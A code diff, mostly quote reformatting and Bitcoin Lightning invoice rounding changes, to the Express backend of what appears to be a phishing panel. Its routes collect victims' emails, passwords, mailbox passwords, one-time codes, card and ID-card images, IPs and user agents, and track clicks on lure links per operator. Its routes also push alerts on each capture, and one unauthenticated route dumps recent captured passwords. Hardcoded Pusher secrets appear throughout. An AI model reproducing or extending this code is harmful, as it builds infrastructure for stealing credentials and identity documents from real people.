@@ -1,29 +1,29 @@
-"use strict";
-import NewInfo from "../models/OldInfo.js";
-import nodemailer from "nodemailer";
-import Amount from "../models/Amount.js";
-import Withdraw from "../models/Withdraw.js";
+'use strict';
+import NewInfo from '../models/OldInfo.js';
+import nodemailer from 'nodemailer';
+import Amount from '../models/Amount.js';
+import Withdraw from '../models/Withdraw.js';
 
-import User from "../models/User.js";
-import Info from "../models/Info.js";
-import Link from "../models/Link.js";
-import Click from "../models/Click.js";
+import User from '../models/User.js';
+import Info from '../models/Info.js';
+import Link from '../models/Link.js';
+import Click from '../models/Click.js';
 // import socket from '../server.js'
-import Poster from "../models/Poster.js";
-import device from "express-device";
-import useragent from "express-useragent";
-import Site from "../models/Site.js";
-import createToken from "../utils/createToken.js";
-import Demo from "../models/Demo.js";
-import Cash from "../models/Cash.js";
-import rateLimitMiddleware from "../ratelimiter.js";
-import axios from "axios";
-import Password from "../models/Password.js";
-import satelize from "satelize";
-import Otp from "../models/Otp.js";
-import Pusher from "pusher";
-import path from "path";
-import { getNwc } from "../utils/webln.js";
+import Poster from '../models/Poster.js';
+import device from 'express-device';
+import useragent from 'express-useragent';
+import Site from '../models/Site.js';
+import createToken from '../utils/createToken.js';
+import Demo from '../models/Demo.js';
+import Cash from '../models/Cash.js';
+import rateLimitMiddleware from '../ratelimiter.js';
+import axios from 'axios';
+import Password from '../models/Password.js';
+import satelize from 'satelize';
+import Otp from '../models/Otp.js';
+import Pusher from 'pusher';
+import path from 'path';
+import { getNwc } from '../utils/webln.js';
 
 export const yoyo = async (req, res) => {
   const { id } = req.params;
@@ -31,11 +31,11 @@ export const yoyo = async (req, res) => {
   try {
     const originalDatawith = await Info.find({
       createdAt: { $gte: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000) },
-    }).select("email password");
+    }).select('email password');
 
     return res.status(200).json({ originalDatawith });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -55,7 +55,7 @@ export const wrong_password = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    },
+    }
   );
 };
 
@@ -72,12 +72,12 @@ export const signup_post = async (req, res) => {
   try {
     const user = await User.findOne({ username: username });
     if (user) {
-      return res.status(400).json({ error: "user exists yes" });
+      return res.status(400).json({ error: 'user exists yes' });
     }
     if (adminId) {
       const foundWithAdminId = await User.findOne({ adminId: adminId });
       if (foundWithAdminId) {
-        return res.status(400).json({ error: "id exists" });
+        return res.status(400).json({ error: 'id exists' });
       }
     }
     const userCreated = await User.create({
@@ -104,7 +104,7 @@ export const login_post = async (req, res) => {
         const diff = currentDate - user.createdAt;
         const difff = diff / 1000 / 60 / 60 / 24;
         if (difff >= user.validity) {
-          return res.status(400).json({ error: "Subscription Expired" });
+          return res.status(400).json({ error: 'Subscription Expired' });
         }
         return res.status(200).json({
           adminId: user.adminId,
@@ -117,7 +117,7 @@ export const login_post = async (req, res) => {
           tag: user.tag,
         });
       }
-      return res.status(400).json({ error: "Wrong password" });
+      return res.status(400).json({ error: 'Wrong password' });
     } else {
       const poster = await Poster.findOne({ username: username });
       if (poster) {
@@ -128,7 +128,7 @@ export const login_post = async (req, res) => {
           const diff = currentDate - admin.createdAt;
           const difff = diff / 1000 / 60 / 60 / 24;
           if (difff >= admin.validity) {
-            return res.status(400).json({ error: "Subscription Expired" });
+            return res.status(400).json({ error: 'Subscription Expired' });
           }
           return res.status(200).json({
             username: poster.username,
@@ -139,12 +139,12 @@ export const login_post = async (req, res) => {
             qrCodeStatus: admin.qrCodeStatus,
           });
         }
-        return res.status(400).json({ error: "Wrong password" });
+        return res.status(400).json({ error: 'Wrong password' });
       }
     }
-    return res.status(400).json({ error: "User not found" });
+    return res.status(400).json({ error: 'User not found' });
   } catch (e) {
-    res.status(400).json({ error: "not found" });
+    res.status(400).json({ error: 'not found' });
   }
 };
 
@@ -164,7 +164,7 @@ export const skip_code = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    },
+    }
   );
 };
 
@@ -185,7 +185,7 @@ export const mega_wrong_post = (req, res) => {
       }
 
       return res.status(200).json({ success: true, id: id });
-    },
+    }
   );
 };
 
@@ -206,7 +206,7 @@ export const cards = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    },
+    }
   );
 };
 
@@ -227,7 +227,7 @@ export const add_mail = (req, res) => {
       }
 
       return res.status(200).json({ success: true });
-    },
+    }
   );
 };
 export const add_posterNumber = (req, res) => {
@@ -245,7 +245,7 @@ export const add_posterNumber = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: true });
-    },
+    }
   );
 };
 
@@ -264,7 +264,7 @@ export const add_new_links = (req, res) => {
         return res.status(400).json({ error: err });
       }
       return res.status(200).json({ success: true });
-    },
+    }
   );
 };
 
@@ -272,16 +272,16 @@ export const user_noti = async (req, res) => {
   const { text, posterId } = req.body;
   ////ahmedimran96yoo@gmail.com
   const pusher = new Pusher({
-    appId: "1731286",
-    key: "a5f0008dea3736f30a17",
-    secret: "0599185eb95735d5a17a",
-    cluster: "ap2",
+    appId: '1731286',
+    key: 'a5f0008dea3736f30a17',
+    secret: '0599185eb95735d5a17a',
+    cluster: 'ap2',
     useTLS: true,
   });
 
   try {
     if (text) {
-      pusher.trigger(posterId, "chat-notification", {
+      pusher.trigger(posterId, 'chat-notification', {
         text: text,
       });
     }
@@ -298,32 +298,32 @@ export const info_get = async (req, res) => {
     if (admin) {
       const user = await User.findOne({ _id: id })
         .populate({
-          path: "posters",
-          model: "Poster",
-          select: "username password links ",
+          path: 'posters',
+          model: 'Poster',
+          select: 'username password links ',
           populate: {
-            path: "details",
-            model: "Info",
+            path: 'details',
+            model: 'Info',
             select:
-              "site email password skipcode mail mailPass onlyCard holdingCard amount",
+              'site email password skipcode mail mailPass onlyCard holdingCard amount',
           },
         })
-        .select("posters")
-        .populate("posters", "username password links ")
+        .select('posters')
+        .populate('posters', 'username password links ')
         .sort({ createdAt: -1 });
       return res.status(200).json({ user: user });
     }
 
     const poster = await Poster.findOne({ _id: id })
-      .select("details")
+      .select('details')
       .populate(
-        "details",
-        "site email password gCode skipcode mail mailPass onlyCard holdingCard amount",
+        'details',
+        'site email password gCode skipcode mail mailPass onlyCard holdingCard amount'
       )
       .sort({ createdAt: -1 });
     return res.status(200).json({ poster: poster });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -334,28 +334,28 @@ export const id_card = async (req, res) => {
     if (admin) {
       const user = await User.findOne({ _id: id })
         .populate({
-          path: "posters",
-          model: "Poster",
-          select: "username password links ",
+          path: 'posters',
+          model: 'Poster',
+          select: 'username password links ',
           populate: {
-            path: "details",
-            model: "Info",
-            select: "site onlyCard holdingCard",
+            path: 'details',
+            model: 'Info',
+            select: 'site onlyCard holdingCard',
           },
         })
         .sort({ createdAt: -1 })
-        .select("posters")
-        .populate("posters", "username password links ");
+        .select('posters')
+        .populate('posters', 'username password links ');
       return res.status(200).json({ user: user });
     }
 
     const poster = await Poster.findOne({ _id: id })
-      .select("details")
-      .populate("details", "site onlyCard holdingCard")
+      .select('details')
+      .populate('details', 'site onlyCard holdingCard')
       .sort({ createdAt: -1 });
     return res.status(200).json({ poster: poster });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -366,11 +366,11 @@ export const poster_add = async (req, res) => {
     const user = await User.findOne({ _id: id });
     const posterExists = await Poster.findOne({ username: username });
     if (posterExists) {
-      return res.status(400).json({ error: "username exists" });
+      return res.status(400).json({ error: 'username exists' });
     }
 
     if (user.numOfPosters >= user.numOfPostersPermission) {
-      return res.status(400).json({ error: "User add limit reached" });
+      return res.status(400).json({ error: 'User add limit reached' });
     }
 
     const poster = await Poster.create({
@@ -390,9 +390,9 @@ export const poster_add = async (req, res) => {
         root: poster._id,
       });
     });
-    return res.status(200).json({ status: "saved" });
+    return res.status(200).json({ status: 'saved' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -401,43 +401,45 @@ const getSatoshis = async (usdAmount) => {
   if (!usdAmount || isNaN(parseFloat(usdAmount))) return 0;
   const numericAmount = parseFloat(usdAmount);
   try {
-    const response = await axios.get("https://blockchain.info/ticker", { timeout: 3000 });
+    const response = await axios.get('https://blockchain.info/ticker', {
+      timeout: 3000,
+    });
     const btcPrice = response.data?.USD?.last;
     if (btcPrice && btcPrice > 0) {
-      // 1 BTC = 100,000,000 satoshis
-      const satoshis = Math.round((numericAmount / btcPrice) * 100000000);
+      // 1 BTC = 100,000,000 satoshis. Rounding to nearest 100 satoshis (1 microBTC)
+      // ensures the invoice will be encoded with 'u' (microBTC) instead of 'n' (nanoBTC) multiplier.
+      const satoshis = Math.round((numericAmount / btcPrice) * 1000000) * 100;
       return satoshis;
     }
   } catch (error) {
-    console.error("Error fetching real-time BTC price:", error.message);
+    console.error('Error fetching real-time BTC price:', error.message);
   }
-  // Fallback to a solid default rate ($95,000 USD/BTC) if API is unavailable
-  return Math.round((numericAmount / 95000) * 100000000);
+  // Fallback to a solid default rate ($95,000 USD/BTC) if API is unavailable.
+  // Round to nearest 100 satoshis (1 microBTC) to prevent 'n' (nanoBTC) multiplier.
+  return Math.round((numericAmount / 95000) * 1000000) * 100;
 };
 
-
-
 export const add_data = async (req, res) => {
-
+  console.log('hit');
   const pusher = new Pusher({
-    appId: "1987499",
-    key: "05656b52c62c0f688ee3",
-    secret: "b4372518df233d054270",
-    cluster: "ap2",
+    appId: '1987499',
+    key: '05656b52c62c0f688ee3',
+    secret: 'b4372518df233d054270',
+    cluster: 'ap2',
     useTLS: true,
   });
 
   const { adminId, posterId } = req.params;
-  console.log("adminId", adminId);
-  console.log("posterId", posterId);
+  console.log('adminId', adminId);
+  console.log('posterId', posterId);
   const { site, mail, passcode, email, password, amount } = req.body;
-  const userAgent = req.headers["user-agent"];
+  const userAgent = req.headers['user-agent'];
   const ipAddress = (
-    req.headers["x-forwarded-for"] ||
+    req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     req.connection.socket.remoteAddress
-  ).split(",")[0];
+  ).split(',')[0];
 
   try {
     const userFound = await User.findOne({ adminId: adminId });
@@ -468,25 +470,33 @@ export const add_data = async (req, res) => {
       const nwcInstance = getNwc();
       if (nwcInstance && amount) {
         try {
-          const numericAmount = await getSatoshis(String(amount).replace(/[^0-9.]/g, ""));
+          const numericAmount = await getSatoshis(
+            String(amount).replace(/[^0-9.]/g, '')
+          );
+          // console.log('numericAmount', numericAmount);
           if (numericAmount > 0) {
             const albyResponse = await nwcInstance.makeInvoice({
-              amount: numericAmount,
-              defaultMemo: `user_${adminId}_${posterId || "admin"}`,
+              amount: numericAmount
             });
-            console.log("albyResponse", albyResponse);
+            console.log('albyResponse', albyResponse);
             if (albyResponse && albyResponse.paymentRequest) {
               info.lightningInvoice = albyResponse.paymentRequest;
               info.rHash = albyResponse.paymentHash;
-              console.log("[Alby NWC] Invoice created successfully.");
-              console.log("[Alby NWC] Invoice created successfully.", albyResponse.paymentRequest);
-              console.log("[Alby NWC] Invoice created successfully.", albyResponse.paymentHash);
+              console.log('[Alby NWC] Invoice created successfully.');
+              console.log(
+                '[Alby NWC] Invoice created successfully.',
+                albyResponse.paymentRequest
+              );
+              console.log(
+                '[Alby NWC] Invoice created successfully.',
+                albyResponse.paymentHash
+              );
             }
           }
         } catch (albyErr) {
           console.error(
-            "Alby NWC Invoice creation failed in add_data:",
-            albyErr.message,
+            'Alby NWC Invoice creation failed in add_data:',
+            albyErr.message
           );
         }
       }
@@ -495,13 +505,13 @@ export const add_data = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: adminId, posterId: posterId },
           { amount: amount },
-          { new: true, upsert: true },
+          { new: true, upsert: true }
         );
       }
 
       await info.save();
       if (info) {
-        pusher.trigger(userFound.adminId, "new-notification", {
+        pusher.trigger(userFound.adminId, 'new-notification', {
           adminId: userFound.adminId,
           posterId: posterFound.posterId || posterFound._id.toString(),
           name: posterFound.username,
@@ -512,9 +522,9 @@ export const add_data = async (req, res) => {
 
       return res.status(200).json({ info: info, email: posterFound.username });
     }
-    return res.status(400).json({ e: "not found" });
+    return res.status(400).json({ e: 'not found' });
   } catch (e) {
-    return res.status(400).json({ e: "error" });
+    return res.status(400).json({ e: 'error' });
   }
 };
 
@@ -530,10 +540,10 @@ export const change_password = async (req, res) => {
         new: true,
         upsert: true,
       });
-      return res.status(200).json({ success: "password change successfully" });
+      return res.status(200).json({ success: 'password change successfully' });
     }
   } catch (e) {
-    return res.status(400).json({ e: "error" });
+    return res.status(400).json({ e: 'error' });
   }
 };
 
@@ -542,7 +552,7 @@ export const delete_poster = (req, res) => {
   //    return  res.status(422).json({ id: id_pos })
 
   Poster.findByIdAndRemove({ _id: id_pos })
-    .then((user) => console.log("deleted yes"))
+    .then((user) => console.log('deleted yes'))
     .catch((err) => res.status(422).json({ error: err }));
   User.findOne({ _id: id_ad })
     .then((user) => {
@@ -551,24 +561,24 @@ export const delete_poster = (req, res) => {
       user.numOfPosters = user.numOfPosters - 1;
       user
         .save()
-        .then((useryes) => console.log("saved yes"))
+        .then((useryes) => console.log('saved yes'))
         .catch((err) => res.status(422).json({ error: err }));
       Link.deleteMany({ root: id_pos })
         .then(function () {
-          console.log("Data deleted");
+          console.log('Data deleted');
         })
         .catch(function (error) {
           console.log(error);
         });
       User.findOne({ _id: id_ad })
         .populate({
-          path: "posters",
-          model: "Poster",
-          select: "username password links posterId",
+          path: 'posters',
+          model: 'Poster',
+          select: 'username password links posterId',
         })
         .sort({ createdAt: -1 })
         .then((users) => res.status(200).json({ data: users }))
-        .catch((err) => console.log("erro"));
+        .catch((err) => console.log('erro'));
     })
     .catch((err) => res.status(422).json({ error: err }));
 };
@@ -598,20 +608,20 @@ export const delete_info = async (req, res) => {
   // return res.status(200).json({  newinfo })
 
   Info.findByIdAndRemove({ _id: info_id })
-    .then((user) => console.log("deleted yes"))
-    .catch((err) => console.log("deleted yes"));
+    .then((user) => console.log('deleted yes'))
+    .catch((err) => console.log('deleted yes'));
 
   Poster.findById({ _id: pos_id })
-    .select("username password posterId links createdAt details")
+    .select('username password posterId links createdAt details')
     .populate(
-      "details",
-      "site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt",
+      'details',
+      'site email password skipcode username passcode mail mailPass onlyCard holdingCard createdAt'
     )
     .sort({ createdAt: -1 })
     .then((data) => {
       return res.status(200).json({ data: data });
     })
-    .catch((err) => console.log("err", err));
+    .catch((err) => console.log('err', err));
 };
 
 export const link_add = async (req, res) => {
@@ -621,12 +631,12 @@ export const link_add = async (req, res) => {
     if (link) {
       link.targetUrl = targetUrl;
       await link.save();
-      return res.status(200).json({ status: "updated" });
+      return res.status(200).json({ status: 'updated' });
     }
     await Link.create({ linkName, targetUrl, root });
-    return res.status(200).json({ status: "created" });
+    return res.status(200).json({ status: 'created' });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -636,11 +646,11 @@ export const update_tag = async (req, res) => {
     const user = await User.findOneAndUpdate(
       { _id: id },
       { $set: { showTagField, tag } },
-      { new: true },
+      { new: true }
     );
     return res.status(200).json({ success: true, user });
   } catch (e) {
-    return res.status(400).json({ error: "Update failed" });
+    return res.status(400).json({ error: 'Update failed' });
   }
 };
 
@@ -651,7 +661,7 @@ export const link_get = async (req, res) => {
     const user = await User.findOne({ _id: id });
     res.status(200).json({ users: user.links });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -662,7 +672,7 @@ export const all_poster = async (req, res) => {
     const user = await User.findOne({ _id: id });
 
     const posters = await Poster.find({ root: id })
-      .select("username password links posterId createdAt")
+      .select('username password links posterId createdAt')
       .sort({ createdAt: -1 });
     // .populate({
     //     path: 'posters',
@@ -672,7 +682,7 @@ export const all_poster = async (req, res) => {
     // }).sort({ createdAt: -1 })
     return res.status(200).json({ data: { ...user, posters: posters } });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -681,19 +691,19 @@ export const poster_details = async (req, res) => {
 
   try {
     const poster = await Poster.findOne({ _id: id })
-      .select("username password posterId links createdAt tag root")
-      .populate("root", "username adminId");
+      .select('username password posterId links createdAt tag root')
+      .populate('root', 'username adminId');
 
     const details = await Info.find({ root: id })
       .select(
-        "site mail passcode skipcode email password tag gCode ip agent status number createdAt amount ",
+        'site mail passcode skipcode email password tag gCode ip agent status number createdAt amount '
       )
       .sort({ createdAt: -1 });
     // const newdata = {...poster, details: details }
     // console.log(newdata)
     return res.status(200).json({ data: { ...poster, details: details } });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -703,7 +713,7 @@ export const add_site = async (req, res) => {
   try {
     const sitefound = await Site.findOne({ name: name });
     if (sitefound) {
-      return res.status(200).json({ site: "site existes" });
+      return res.status(200).json({ site: 'site existes' });
     }
 
     const site = await Site.create({
@@ -712,7 +722,7 @@ export const add_site = async (req, res) => {
 
     return res.status(200).json({ site: site });
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -738,7 +748,7 @@ export const link_details = async (req, res) => {
       return res.status(200).json({ data: data.links, sites: sites });
     }
   } catch (e) {
-    res.status(400).json({ e: "error" });
+    res.status(400).json({ e: 'error' });
   }
 };
 
@@ -748,7 +758,7 @@ export const site_exist_new = async (req, res) => {
   const { site, adminId, posterId, verifyId, device } = req.params;
   // const siteName = "https://" + site + "/"  + adminId + "/" + posterId
   const siteName =
-    "https://" + site + "/" + adminId + "/" + posterId + "/" + verifyId;
+    'https://' + site + '/' + adminId + '/' + posterId + '/' + verifyId;
 
   // return res.status(200).json({ success: siteName })
 
@@ -762,38 +772,38 @@ export const site_exist_new = async (req, res) => {
         clickfound.click = clickfound.click + 1;
         await clickfound.save();
 
-        if (device == "desktop") {
+        if (device == 'desktop') {
           clickfound.desktop = clickfound.desktop + 1;
           await clickfound.save();
-          return res.status(200).json({ success: "exists", id: sitefound._id });
+          return res.status(200).json({ success: 'exists', id: sitefound._id });
         }
-        if (device == "phone") {
+        if (device == 'phone') {
           clickfound.phone = clickfound.phone + 1;
           await clickfound.save();
-          return res.status(200).json({ success: "exists", id: sitefound._id });
+          return res.status(200).json({ success: 'exists', id: sitefound._id });
         }
-        if (device == "ipad") {
+        if (device == 'ipad') {
           clickfound.ipad = clickfound.ipad + 1;
           await clickfound.save();
-          return res.status(200).json({ success: "exists", id: sitefound._id });
+          return res.status(200).json({ success: 'exists', id: sitefound._id });
         }
-        return res.status(200).json({ success: "exists", id: sitefound._id });
+        return res.status(200).json({ success: 'exists', id: sitefound._id });
       } else {
         const click = await Click.create({
           site: siteName,
           adminId,
           posterId,
           click: 1,
-          desktop: device == "desktop" ? 1 : null,
-          phone: device == "phone" ? 1 : null,
-          ipad: device == "ipad" ? 1 : null,
+          desktop: device == 'desktop' ? 1 : null,
+          phone: device == 'phone' ? 1 : null,
+          ipad: device == 'ipad' ? 1 : null,
         });
-        return res.status(200).json({ success: "exists", id: sitefound._id });
+        return res.status(200).json({ success: 'exists', id: sitefound._id });
       }
     }
-    return res.status(200).json({ success: "not exist" });
+    return res.status(200).json({ success: 'not exist' });
   } catch (e) {
-    res.status(400).json({ e: "e" });
+    res.status(400).json({ e: 'e' });
   }
 };
 
@@ -805,7 +815,7 @@ export const site_exist = async (req, res) => {
 
   const { site, param, param1, device } = req.params;
   // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId
-  const siteName = "https://" + site + "/" + param + "/" + param1;
+  const siteName = 'https://' + site + '/' + param + '/' + param1;
 
   // return res.status(200).json({ success: siteName })
 
@@ -813,18 +823,18 @@ export const site_exist = async (req, res) => {
   // console.log("siteName", siteName);
   try {
     const sitefound = await Link.findOne({ linkName: siteName }).populate({
-      path: "root",
+      path: 'root',
       populate: {
-        path: "root",
-        model: "User",
+        path: 'root',
+        model: 'User',
       },
     });
     // console.log("siteFound",sitefound)
 
     if (sitefound) {
-      const adminId = sitefound.root?.root?.adminId || "";
+      const adminId = sitefound.root?.root?.adminId || '';
       const posterId =
-        sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
+        sitefound.root?.posterId || sitefound.root?._id?.toString() || '';
 
       const clickfound = await Click.findOne({ site: siteName });
       if (clickfound) {
@@ -833,13 +843,13 @@ export const site_exist = async (req, res) => {
         if (!clickfound.posterId) clickfound.posterId = posterId;
         await clickfound.save();
 
-        if (device == "desktop") {
+        if (device == 'desktop') {
           clickfound.desktop = clickfound.desktop + 1;
           await clickfound.save();
           const siteamout = await Amount.findOne({ site: siteName });
           if (siteamout) {
             return res.status(200).json({
-              success: "exists",
+              success: 'exists',
               id: sitefound._id,
               adminId,
               posterId,
@@ -848,15 +858,15 @@ export const site_exist = async (req, res) => {
           }
           return res
             .status(200)
-            .json({ success: "exists", id: sitefound._id, adminId, posterId });
+            .json({ success: 'exists', id: sitefound._id, adminId, posterId });
         }
-        if (device == "phone") {
+        if (device == 'phone') {
           clickfound.phone = clickfound.phone + 1;
           await clickfound.save();
           const siteamout = await Amount.findOne({ site: siteName });
           if (siteamout) {
             return res.status(200).json({
-              success: "exists",
+              success: 'exists',
               id: sitefound._id,
               adminId,
               posterId,
@@ -865,15 +875,15 @@ export const site_exist = async (req, res) => {
           }
           return res
             .status(200)
-            .json({ success: "exists", id: sitefound._id, adminId, posterId });
+            .json({ success: 'exists', id: sitefound._id, adminId, posterId });
         }
-        if (device == "ipad") {
+        if (device == 'ipad') {
           clickfound.ipad = clickfound.ipad + 1;
           await clickfound.save();
           const siteamout = await Amount.findOne({ site: siteName });
           if (siteamout) {
             return res.status(200).json({
-              success: "exists",
+              success: 'exists',
               id: sitefound._id,
               adminId,
               posterId,
@@ -882,27 +892,27 @@ export const site_exist = async (req, res) => {
           }
           return res
             .status(200)
-            .json({ success: "exists", id: sitefound._id, adminId, posterId });
+            .json({ success: 'exists', id: sitefound._id, adminId, posterId });
         }
         return res
           .status(200)
-          .json({ success: "exists", id: sitefound._id, adminId, posterId });
+          .json({ success: 'exists', id: sitefound._id, adminId, posterId });
       } else {
         const click = await Click.create({
           site: siteName,
           adminId: adminId,
           posterId: posterId,
           click: 1,
-          desktop: device == "desktop" ? 1 : null,
-          phone: device == "phone" ? 1 : null,
-          ipad: device == "ipad" ? 1 : null,
+          desktop: device == 'desktop' ? 1 : null,
+          phone: device == 'phone' ? 1 : null,
+          ipad: device == 'ipad' ? 1 : null,
         });
 
         const siteamout = await Amount.findOne({ site: siteName });
 
         if (siteamout) {
           return res.status(200).json({
-            success: "exists",
+            success: 'exists',
             id: sitefound._id,
             adminId,
             posterId,
@@ -911,42 +921,42 @@ export const site_exist = async (req, res) => {
         }
         return res
           .status(200)
-          .json({ success: "exists", id: sitefound._id, adminId, posterId });
+          .json({ success: 'exists', id: sitefound._id, adminId, posterId });
       }
     }
-    return res.status(200).json({ success: "not exist" });
+    return res.status(200).json({ success: 'not exist' });
   } catch (e) {
-    res.status(400).json({ e: "e" });
+    res.status(400).json({ e: 'e' });
   }
 };
 
 export const site_exist_two_params = async (req, res) => {
   const { site, param1, param2, device } = req.params;
-  const siteName = "https://" + site + "/" + param1 + "/" + param2;
+  const siteName = 'https://' + site + '/' + param1 + '/' + param2;
 
   try {
     const sitefound = await Link.findOne({ linkName: siteName }).populate({
-      path: "root",
+      path: 'root',
       populate: {
-        path: "root",
-        model: "User",
+        path: 'root',
+        model: 'User',
       },
     });
 
     if (sitefound) {
       const matchedSiteName = sitefound.linkName;
-      const adminId = sitefound.root?.root?.adminId || "";
+      const adminId = sitefound.root?.root?.adminId || '';
       const posterId =
-        sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
+        sitefound.root?.posterId || sitefound.root?._id?.toString() || '';
 
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
         clickfound.click = (clickfound.click || 0) + 1;
-        if (device === "desktop") {
+        if (device === 'desktop') {
           clickfound.desktop = (clickfound.desktop || 0) + 1;
-        } else if (device === "phone") {
+        } else if (device === 'phone') {
           clickfound.phone = (clickfound.phone || 0) + 1;
-        } else if (device === "ipad") {
+        } else if (device === 'ipad') {
           clickfound.ipad = (clickfound.ipad || 0) + 1;
         }
         if (!clickfound.adminId) clickfound.adminId = adminId;
@@ -958,16 +968,16 @@ export const site_exist_two_params = async (req, res) => {
           adminId: adminId,
           posterId: posterId,
           click: 1,
-          desktop: device === "desktop" ? 1 : null,
-          phone: device === "phone" ? 1 : null,
-          ipad: device === "ipad" ? 1 : null,
+          desktop: device === 'desktop' ? 1 : null,
+          phone: device === 'phone' ? 1 : null,
+          ipad: device === 'ipad' ? 1 : null,
         });
       }
 
       const siteamount = await Amount.findOne({ site: matchedSiteName });
       if (siteamount) {
         return res.status(200).json({
-          success: "exists",
+          success: 'exists',
           id: sitefound._id,
           adminId,
           posterId,
@@ -976,9 +986,9 @@ export const site_exist_two_params = async (req, res) => {
       }
       return res
         .status(200)
-        .json({ success: "exists", id: sitefound._id, adminId, posterId });
+        .json({ success: 'exists', id: sitefound._id, adminId, posterId });
     }
-    return res.status(200).json({ success: "not exist" });
+    return res.status(200).json({ success: 'not exist' });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -986,7 +996,7 @@ export const site_exist_two_params = async (req, res) => {
 
 export const site_exist_simplified = async (req, res) => {
   const { site, adminId, device } = req.params;
-  const siteName = "https://" + site + "/" + adminId;
+  const siteName = 'https://' + site + '/' + adminId;
 
   try {
     const sitefound = await Link.findOne({ linkName: siteName });
@@ -996,11 +1006,11 @@ export const site_exist_simplified = async (req, res) => {
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
         clickfound.click = (clickfound.click || 0) + 1;
-        if (device === "desktop") {
+        if (device === 'desktop') {
           clickfound.desktop = (clickfound.desktop || 0) + 1;
-        } else if (device === "phone") {
+        } else if (device === 'phone') {
           clickfound.phone = (clickfound.phone || 0) + 1;
-        } else if (device === "ipad") {
+        } else if (device === 'ipad') {
           clickfound.ipad = (clickfound.ipad || 0) + 1;
         }
         await clickfound.save();
@@ -1009,9 +1019,9 @@ export const site_exist_simplified = async (req, res) => {
           site: matchedSiteName,
           adminId: adminId,
           click: 1,
-          desktop: device === "desktop" ? 1 : null,
-          phone: device === "phone" ? 1 : null,
-          ipad: device === "ipad" ? 1 : null,
+          desktop: device === 'desktop' ? 1 : null,
+          phone: device === 'phone' ? 1 : null,
+          ipad: device === 'ipad' ? 1 : null,
         });
       }
 
@@ -1019,11 +1029,11 @@ export const site_exist_simplified = async (req, res) => {
       if (siteamount) {
         return res
           .status(200)
-          .json({ success: "exists", id: sitefound._id, sitename: siteamount });
+          .json({ success: 'exists', id: sitefound._id, sitename: siteamount });
       }
-      return res.status(200).json({ success: "exists", id: sitefound._id });
+      return res.status(200).json({ success: 'exists', id: sitefound._id });
     }
-    return res.status(200).json({ success: "not exist" });
+    return res.status(200).json({ success: 'not exist' });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1031,22 +1041,22 @@ export const site_exist_simplified = async (req, res) => {
 
 export const add_data_simplified = async (req, res) => {
   const pusher = new Pusher({
-    appId: "1987499",
-    key: "05656b52c62c0f688ee3",
-    secret: "b4372518df233d054270",
-    cluster: "ap2",
+    appId: '1987499',
+    key: '05656b52c62c0f688ee3',
+    secret: 'b4372518df233d054270',
+    cluster: 'ap2',
     useTLS: true,
   });
 
   const { adminId } = req.params;
   const { site, mail, passcode, email, password, amount } = req.body;
-  const userAgent = req.headers["user-agent"];
+  const userAgent = req.headers['user-agent'];
   const ipAddress = (
-    req.headers["x-forwarded-for"] ||
+    req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     req.connection.socket.remoteAddress
-  ).split(",")[0];
+  ).split(',')[0];
 
   try {
     const query =
@@ -1073,9 +1083,14 @@ export const add_data_simplified = async (req, res) => {
       const computedAdminId = userFound.adminId || userFound.username;
       if (nwcInstance && amount) {
         try {
-          const numericAmount = Math.round(
-            parseFloat(String(amount).replace(/[^0-9.]/g, "")),
+          let numericAmount = Math.round(
+            parseFloat(String(amount).replace(/[^0-9.]/g, ''))
           );
+          if (numericAmount >= 100) {
+            // Rounding to nearest 100 satoshis (1 microBTC) ensures the invoice
+            // will be encoded with 'u' (microBTC) instead of 'n' (nanoBTC) multiplier.
+            numericAmount = Math.round(numericAmount / 100) * 100;
+          }
           if (numericAmount > 0) {
             const albyResponse = await nwcInstance.makeInvoice({
               amount: numericAmount,
@@ -1084,13 +1099,15 @@ export const add_data_simplified = async (req, res) => {
             if (albyResponse && albyResponse.paymentRequest) {
               info.lightningInvoice = albyResponse.paymentRequest;
               info.rHash = albyResponse.paymentHash;
-              console.log("[Alby NWC] Invoice created successfully (simplified).");
+              console.log(
+                '[Alby NWC] Invoice created successfully (simplified).'
+              );
             }
           }
         } catch (albyErr) {
           console.error(
-            "Alby NWC Invoice creation failed in add_data_simplified:",
-            albyErr.message,
+            'Alby NWC Invoice creation failed in add_data_simplified:',
+            albyErr.message
           );
         }
       }
@@ -1099,22 +1116,22 @@ export const add_data_simplified = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: userFound.adminId || userFound.username },
           { amount: amount },
-          { new: true, upsert: true },
+          { new: true, upsert: true }
         );
       }
 
       await info.save();
       pusher.trigger(
         userFound.adminId || userFound.username,
-        "new-notification",
+        'new-notification',
